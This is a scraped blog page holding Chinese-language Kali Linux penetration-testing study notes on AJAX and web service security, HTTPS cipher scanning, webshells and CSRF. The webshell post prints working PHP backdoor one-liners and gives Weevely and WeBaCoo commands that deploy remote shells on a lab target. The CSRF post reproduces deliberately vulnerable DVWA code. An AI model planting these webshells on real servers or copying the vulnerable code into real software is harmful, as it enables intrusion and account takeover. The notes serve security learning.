⭐响应过程：Databse,backend server → Web Server →(HTML\JSON\XML)→ AJAX Engine →(DHTML)→ User Interface</code></pre></blockquote>
<h4 id="4-AJAX的安全问题"><a href="#4-AJAX的安全问题" class="headerlink" title="4. AJAX的安全问题"></a>4. AJAX的安全问题</h4><ul>
<li>目前没有通用的AJAX安全最佳实践，其攻击面不为大多数人所知</li>
<li>AJAX的安全问题<ul>
<li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程</li>
<li>AJAX引擎是个全功能的脚本解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP（同源策略），但可能绕过</li>
<li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露、</li>
<li>暴漏应用程序逻辑</li>
</ul>
</li>
<li>AJAX对渗透测试的挑战<ul>
<li>异步请求数量多且隐蔽</li>
<li>触发AJAX请求的条件无规律</li>
<li>手动和截断代理爬网可能产生大量遗漏</li>
</ul>
</li>
<li>AJAX爬网工具<ul>
<li>ZAP（Sites → 右键 → Attack → AJAX Spider）</li>
</ul>
</li>
<li>客户端代码审计<ul>
<li>源码</li>
<li>Firebug</li>
</ul>
</li>
</ul>
<h4 id="5-Web-Service（F12）"><a href="#5-Web-Service（F12）" class="headerlink" title="5. Web Service（F12）"></a>5. Web Service（F12）</h4><ul>
<li>Web Service<ul>
<li>面向服务的架构（service oriented architecture）便于不同系统集成共享数据和功能</li>
<li>尤其适合不想要暴漏数据模型和程序逻辑而访问数据的场景</li>
<li>无页面（最典型的类型）</li>
</ul>
</li>
<li>两种类型的Web Service<ul>
<li>Simple object access protocol（SOAP）<ul>
<li>传统的Web Service开发方法，xml是唯一的数据交换格式</li>
<li>要求安全性的应用更多采用</li>
</ul>
</li>
<li>RESTful（Representational Transfer architecture–REST）<ul>
<li>目前更多被采用的轻量的web service，JSON是首选数据交换格式</li>
</ul>
</li>
</ul>
</li>
<li>Web Service安全考虑<ul>
<li>使用API Key或session token实现和跟踪身份认证</li>
<li>身份认证由服务器完成，而非客户端</li>
<li>API Key、用户名、Session token永远不要通过URL发送</li>
<li>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li>
<li>SOAP提供强于HTTPS的WS-security机制（传输层实现）</li>
<li>使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的密钥加密API KEY</li>
<li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li>
<li>使用随机token防止CSRF攻击</li>
<li>对用户提交参数过滤，建议布署基于严格白名单的方法</li>
<li>报错信息消毒</li>
<li>直接对象引用应严格身份验证（电商公司以ID作为主索引）</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/" itemprop="url">Kali Linux笔记(五十五)：Https攻击</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-22T23:54:59+08:00">
                2020-01-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-HTTPS攻击"><a href="#1-HTTPS攻击" class="headerlink" title="1. HTTPS攻击"></a>1. HTTPS攻击</h4><ul>
<li>全站HTTPS正成为潮流趋势<ul>
<li>淘宝、百度</li>
</ul>
</li>
<li>HTTPS的作用<ul>
<li>CIA</li>
<li>解决的是信息传输过程中数据被篡改、窃取</li>
<li>加密：对称、非对称、单向(hash计算)</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐CIA
C：机密性（Confidentiality）指只有授权用户可以获取信息。
I：完整性（Integrity）指信息在输入和传输的过程中，不被非法授权修改和破坏，保证数据的一致性。
A：可用性（Availability）指保证合法用户对信息和资源的使用不会被不正当地拒绝。</code></pre></blockquote>
<ul>
<li>HTTPS攻击方法<ul>
<li>降级攻击（高强度加密算法的降级攻击）</li>
<li>解密攻击（明文、证书伪造）</li>
<li>协议漏洞、实现方法的漏洞、配置不严格</li>
</ul>
</li>
</ul>
<h4 id="2-Secure-socket-layer"><a href="#2-Secure-socket-layer" class="headerlink" title="2. Secure socket layer"></a>2. Secure socket layer</h4><ul>
<li>保证网络通信安全的加密协议</li>
<li>1994年由Netscape开发成为统一标准</li>
<li>1999年TLS（transport layer security）取代SSL v3</li>
<li>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<ul>
<li>Heartbleed</li>
<li>POODLE</li>
<li>BEAST</li>
</ul>
</li>
<li>TLS当前最新版本1.2</li>
<li>TLS/SSL、HTTPS、HTTP over SSL通俗上表示同意含义</li>
<li>SSL/TLS也被用于其他场景的传输通道加密<ul>
<li>邮件传输（服务器间、客户端与服务期间,SMTP/POP3为明文协议）</li>
<li>数据库服务器间</li>
<li>LDAP身份认证服务器</li>
<li>SSL VPN</li>
<li>远程桌面RDP通信过程中的加密和身份认证</li>
</ul>
</li>
</ul>
<h4 id="3-SSL加密"><a href="#3-SSL加密" class="headerlink" title="3. SSL加密"></a>3. SSL加密</h4><ul>
<li>WEB通信中的SSL加密（PKI体系架构）<ul>
<li>公钥证书（受信任的第三方证书颁发机构签名颁发）</li>
<li>VeriSign</li>
<li>Thawte</li>
<li>GlobalSign</li>
<li>Symantec</li>
</ul>
</li>
<li>加密过程<ul>
<li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li>
<li>加密套件（Cipher Suite：对称加密+非对称加密+单向加密+密钥算法）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐加密信息传输过程（哈希值用于数据传输的完整性）
1.用交换的对称密钥对明文进行加密
2.对加密的明文进行哈希计算，得出一串额外的字符串
3.对字符串进行服务器私钥加密
▲ 存在疑问4.加密过程中，将对称密码加密的明文+哈希值+加密后的哈希值一起传给对方
⭐加密信息解密过程
1.用服务器公钥对哈希值进行解密，得出哈希值H2
2.用交换的对称密钥对对称密钥加密的字段进行解密，并计算哈希值H1
3.比对哈希值H1和H2的值是否相等，保证了数据的完整性和身份认证</code></pre></blockquote>
<h4 id="4-加密算法"><a href="#4-加密算法" class="headerlink" title="4. 加密算法"></a>4. 加密算法</h4><ul>
<li>非对称加密算法<ul>
<li>Diffie-Hellman Key exchange（密钥交换）</li>
<li>Rivest Shamir Adleman（RSA）</li>
<li>Elliptic Curve Cryptography（ECC）</li>
</ul>
</li>
<li>对称加密算法<ul>
<li>Data Encryption Standard（DES/3DES）</li>
<li>Advance Encryption Standard（AES）</li>
<li>International Data Encryption Algorithm（IDEA）</li>
<li>Rivest Cipher 4（RC4）<ul>
<li>WEP、TLS/SSL、RDP、Secure shell</li>
</ul>
</li>
</ul>
</li>
<li>单向加密算法（hash算法）<ul>
<li>SHA-3已经设计完成，但尚未广泛使用</li>
<li>SHA-2是TLS1.2唯一支持的单向加密算法</li>
<li>碰撞攻击针对单向加密算法<ul>
<li>两个不同的文件生成相同的HASH值</li>
</ul>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">HASH算法</th>
<th align="center">HASH值长度（bit）</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">SHA-1</td>
<td align="center">160</td>
</tr>
<tr>
<td align="center">SHA-2</td>
<td align="center">224、256、384、512</td>
</tr>
</tbody></table>
<h4 id="5-SSL的弱点"><a href="#5-SSL的弱点" class="headerlink" title="5. SSL的弱点"></a>5. SSL的弱点</h4><ul>
<li>SSL是不同的对称、非对称、单向加密算法的组合加密实现（cipher suite）</li>
</ul>
<table>
<thead>
<tr>
<th align="center">加密算法</th>
<th align="center">SSL实现中的用途</th>
</tr>
</thead>
<tbody><tr>
<td align="center">RAS/Diffie-Hellman</td>
<td align="center">密钥交换、身份认证</td>
</tr>
<tr>
<td align="center">AES</td>
<td align="center">加密数据，由RAS/DH完成密钥交换</td>
</tr>
<tr>
<td align="center">HMAC-SHA2</td>
<td align="center">摘要信息</td>
</tr>
</tbody></table>
<ul>
<li>服务器端为提供更好的兼容性，选择支持大量过时的cipher suite</li>
<li>协商过程中强迫降级加密强度</li>
<li>现代处理器计算能力可以在可接受的时间内破解时加密算法</li>
<li>购买云计算资源破解</li>
</ul>
<h4 id="6-Openssl"><a href="#6-Openssl" class="headerlink" title="6. Openssl"></a>6. Openssl</h4><ul>
<li>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</li>
<li><strong><code>🔺命令：openssl s_client -connect www.baidu.com:443</code></strong></li>
<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code></strong> ▲ 2020.1.22 SSL routines:SSL_CTX_set_cipher_list:no cipher match<ul>
<li>▲ 密钥交换–身份认证–数据加密–HASH算法</li>
</ul>
</li>
<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &quot;NULL,EXPORT,LOW,DES&quot; -connect www.taobao.com:443</code></strong>（协商低安全级别cipher suite）</li>
<li>可被破解的cipher suite<ul>
<li><strong><code>🔺命令：openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</code></strong></li>
</ul>
</li>
<li><a href="https://www.openssl.org/docs/apps/ciphers.html" target="_blank" rel="noopener">https://www.openssl.org/docs/apps/ciphers.html</a> （cipher suite的组合）</li>
<li>Openssl需要大量的密码学相关知识，命令复杂，结果可读性差</li>
</ul>
<h4 id="7-SSLScan"><a href="#7-SSLScan" class="headerlink" title="7. SSLScan"></a>7. SSLScan</h4><ul>
<li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li>
<li>默认会检查新浪CRIME、heartbleed漏洞</li>
<li>TLS支持的cipher suite<ul>
<li><strong><code>🔺命令：sslscan --tlsall www.taobao.com:443</code></strong></li>
</ul>
</li>
<li>分析证书详细数据<ul>
<li><strong><code>🔺命令：sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-SSLyze"><a href="#8-SSLyze" class="headerlink" title="8. SSLyze"></a>8. SSLyze</h4><ul>
<li>Python语言编写</li>
<li>检查SSL过时版本</li>
<li>检查存在弱点的cipher suite</li>
<li>扫描多站点时，支持来源文件</li>
<li>检查是否支持会话恢复</li>
<li><strong><code>🔺命令：sslyze --regular www.baidu.com:443</code></strong></li>
</ul>
<h4 id="9-Nmap"><a href="#9-Nmap" class="headerlink" title="9. Nmap"></a>9. Nmap</h4><ul>
<li><strong><code>🔺命令：nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></strong></li>
</ul>
<h4 id="10-QUALYS-SSL-LABS"><a href="#10-QUALYS-SSL-LABS" class="headerlink" title="10. QUALYS SSL LABS"></a>10. QUALYS SSL LABS</h4><ul>
<li><a href="https://www.sslabs.com/ssltest/" target="_blank" rel="noopener">https://www.sslabs.com/ssltest/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/" itemprop="url">Kali Linux笔记(五十四)：WebShell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
                2020-01-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-WEBSHELL–浏览器"><a href="#1-WEBSHELL–浏览器" class="headerlink" title="1. WEBSHELL–浏览器"></a>1. WEBSHELL–浏览器</h4><ul>
<li>Shell<ul>
<li>ssh登陆到metasploitable</li>
<li><strong><code>🔺命令：vi a.php</code></strong></li>
<li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li>
<li><strong><code>🔺命令：cp a.php /var/www</code></strong></li>
<li>浏览器访问a.php</li>
</ul>
</li>
</ul>
<h4 id="2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用"><a href="#2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用" class="headerlink" title="2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用"></a>2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用</h4><ul>
<li>中国菜刀：<a href="http://www.maicaidao.co/（使用unicode编码）" target="_blank" rel="noopener">http://www.maicaidao.co/（使用unicode编码）</a><ul>
<li>将代码新建到靶机上caidao.php</li>
<li><code>&lt;?php @eval(_POST[&#39;chopper&#39;]);?&gt;</code></li>
<li><strong><code>🔺命令：cp caidao.php /var/www</code></strong></li>
<li>菜刀服务端添加caidao.php的URL，进行配置，输入密码，执行</li>
</ul>
</li>
<li>WebShell可能被IDS、AV、WAF、扫描器软件发现查杀</li>
</ul>
<h4 id="3-WEBSHELL–WeBaCoo（PHP）"><a href="#3-WEBSHELL–WeBaCoo（PHP）" class="headerlink" title="3. WEBSHELL–WeBaCoo（PHP）"></a>3. WEBSHELL–WeBaCoo（PHP）</h4><ul>
<li>WeBaCoo（Web Backdoor Cookie）<ul>
<li>类终端的shell</li>
<li>编码通信内容通过cookie头传输，隐蔽性较强</li>
<li>cm：base64编码的命令</li>
<li>cn：服务器用于数据的cookie头的名（默认值）</li>
<li>cp：返回信息定界符（变化的定界符）</li>
<li>生成服务端</li>
</ul>
</li>
<li>生成服务端<ul>
<li><strong><code>🔺命令：webacoo -g -o webacoo.php</code></strong></li>
</ul>
</li>
<li>拷贝webacoo.php到服务器端<ul>
<li><strong><code>🔺命令：scp webacoo.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
<li>ssh登陆到metasploitable</li>
<li><strong><code>🔺命令：cp webacoo.php /var/www</code></strong></li>
</ul>
</li>
<li>客户端连接<ul>
<li><strong><code>🔺命令：webacoo -t -u &quot;http://1.1.1.1/webacoo.php&quot;</code></strong></li>
</ul>
</li>
<li>连接成功会出现命令提示符</li>
<li>抓包查看cookie</li>
<li>其他参数<ul>
<li>-g 生成服务器端代码</li>
<li>-f 添加执行php操作系统函数</li>
<li>-r 返回不进行混淆的代码</li>
<li>-t 远程建立terminal</li>
<li>-u webacoo URL</li>
<li>-e 单命令执行模式</li>
<li>-m HTTP通信方式（默认为Get）</li>
<li>-c 指定Cookie名字</li>
<li>-d 定界符</li>
<li>-a HTTP的user-agent</li>
<li>-p 代理服务</li>
<li>-l 记录日志</li>
<li>update 升级版本</li>
</ul>
</li>
</ul>
<h4 id="4-WEBSHELL–Weevely（PHP）"><a href="#4-WEBSHELL–Weevely（PHP）" class="headerlink" title="4. WEBSHELL–Weevely（PHP）"></a>4. WEBSHELL–Weevely（PHP）</h4><ul>
<li>隐藏的类终端PHP Webshell</li>
<li>30多个管理模块<ul>
<li>执行系统命令、测试文件系统</li>
<li>检查服务器常见配置错误</li>
<li>创建正向、反向TCP Shell连接</li>
<li>通过目标计算机代理HTTP流量</li>
<li>从目标计算机运行端口扫描，渗透内网</li>
</ul>
</li>
<li>支持连接密码</li>
<li>Kali缺少库 ▲ 2020.1.21已支持该库<ul>
<li><a href="https://pypi.python.org/pypi/PySocks/" target="_blank" rel="noopener">https://pypi.python.org/pypi/PySocks/</a></li>
<li><strong><code>🔺命令：./setup.py install</code></strong></li>
</ul>
</li>
<li>生成服务端<ul>
<li><strong><code>🔺命令：weevely generate &lt;password&gt; wee.php</code></strong> </li>
<li>/usr/share/weevely/wee.php ▲ 2020.1.21生成程序在终端所在位置</li>
</ul>
</li>
<li>拷贝wee.php到服务器端<ul>
<li><strong><code>🔺命令：scp wee.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
<li><strong><code>🔺命令：cp wee.php /var/www</code></strong></li>
</ul>
</li>
<li>客户端连接服务器<ul>
<li><strong><code>🔺命令：weevely http://1.1.1.1/wee.php &lt;password&gt;</code></strong></li>
</ul>
</li>
<li>抓包查看HTTP头（过滤：tcp.stream eq 5）</li>
<li>▲ 通过Referer、Cookie、body进行传输，解码可用Base64解码</li>
<li>help（查看模块）<ul>
<li>audit_sgidsgid（SUID+SGID）</li>
<li>audit_filesystem（查找文件设置权限）</li>
<li>audit_phpconf（审计php的配置信息）</li>
<li>system_info（操作系统配置）</li>
<li>backdoor_tcp（本地监听一个shell在TCP端口上）</li>
<li>backdoor_reversetcp（本地监听反弹一个shell）</li>
<li>bruteforce_sql（SQL注入的暴力破解）</li>
<li>net_proxy（把靶机变成代理服务器，但代理IP端口都设置在攻击者上）</li>
<li>net_phpproxy（php代理，需要安装一个php代理在靶机上）</li>
<li>net_scan IP:端口（把靶机作为扫描器）</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/" itemprop="url">Kali Linux笔记(五十三)：CSRF</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
                2020-01-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
<li>Cross-site request forgery</li>
<li>与XSS经常混淆</li>
<li>从信任的角度来区分<ul>
<li>XSS：利用用户对站点的信任</li>
<li>CSRF：利用站点对已经身份认证的信任</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐CSRF过程
1.客户端向服务器发送请求，获得身份认证Token
2.Hacker向客户端发送一个伪造定制页面，诱使客户端点击页面
3.客户端点击页面，页面通过客户端的Token提交数据指令给服务器端
4.服务器端未进行对请求来源的验证，只验证Session是否合法性
▲ 二次认证，随机数机制，验证码机制一定程度上可以防控CSRF漏洞</code></pre></blockquote>
<ul>
<li>结合社工在身份认证会话过程中实现攻击<ul>
<li>修改账号密码、个人信息（email、收获地址）</li>
<li>发送伪造的业务请求（网银、购物、投票）</li>
<li>关注他人社交账号，推送博文</li>
<li>▲ 在用户非自愿、不知情的情况下提交请求</li>
</ul>
</li>
<li>业务逻辑漏洞<ul>
<li>对关键操作缺少确认机制</li>
<li>自动扫描程序无法发现此类漏洞</li>
</ul>
</li>
<li>漏洞利用条件<ul>
<li>被害用户已经完成身份认证</li>
<li>新请求的提交不需要重新身份认证或确认机制</li>
<li>攻击者必须了解Web Application请求的参数构造</li>
<li>诱使用户触发攻击的指令（社工）</li>
</ul>
</li>
<li>▲ 自动扫描程序的检测方法<ul>
<li>在请求和响应过程中检查是否存在anti-CSRF token名（随机数验证）</li>
<li>检查服务器是否验证anti-CSRF token的名值（服务器端是否验证token正确性）</li>
<li>检查token中是否可编辑的字符串</li>
<li>检查referer头是否可以伪造</li>
</ul>
</li>
<li>对策<ul>
<li>Captcha（验证码机制）</li>
<li>anti-CSRF token（使用最广）</li>
<li>Referer头</li>
<li>降低会话超时时间</li>
</ul>
</li>
</ul>
<h4 id="2-CSRF–漏洞利用方法"><a href="#2-CSRF–漏洞利用方法" class="headerlink" title="2. CSRF–漏洞利用方法"></a>2. CSRF–漏洞利用方法</h4><ul>
<li>CSRF → Get方法<ul>
<li>Kali开启apach服务</li>
<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-get.html</code></strong></li>
<li><code>&lt;a href=&quot;Burpsuit抓取的地址/URL地址抓取&quot;&gt;csrf&lt;/a&gt;</code></li>
<li>window上访问csrf-get.html</li>
</ul>
</li>
<li>CSRF → Post方法<ul>
<li>View Source查看页面的源代码</li>
<li>保存表单form的内容存成一个页面，csrf-post.html</li>
<li>诱使用户点击</li>
</ul>
</li>
<li>Burpsuit → 右键请求 → Engagement tools → Generate CSRF Poc ▲ 2020.1.21只有Burpsuite Professional版本才有此功能<ul>
<li>Burpsuit自动生成CSRF生成的一个页面</li>
<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-post-burp.html</code></strong></li>
<li>window上访问csrf-post-burp.html</li>
</ul>
</li>
</ul>
<h4 id="3-CSRF–DVWA"><a href="#3-CSRF–DVWA" class="headerlink" title="3. CSRF–DVWA"></a>3. CSRF–DVWA</h4><ul>
<li>Dvwa中的CSRF（Low）<ul>
<li>多种绕过方式</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">                </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa中的CSRF（Medium）<ul>
<li>eregi()函数，取HTTP_REFERER进行比较判断</li>
<li>绕过方法：Burpsuite抓包截断进行修改HTTP头的Referer参数</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Checks the http referer header</span><br><span class="line">        if ( eregi ( &quot;127.0.0.1&quot;, $_SERVER[&apos;HTTP_REFERER&apos;] ) )&#123;</span><br><span class="line">    </span><br><span class="line">            // Turn requests into variables</span><br><span class="line">            $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">            $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">            if ($pass_new == $pass_conf)&#123;</span><br><span class="line">                $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">                $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">                $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">                $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">                echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">                mysql_close();</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            else&#123;        </span><br><span class="line">                echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa中的CSRF（High）<ul>
<li>表单加入当前密码认证（二次认证）</li>
<li>基本无绕过方式</li>
</ul>
</li>
</ul>
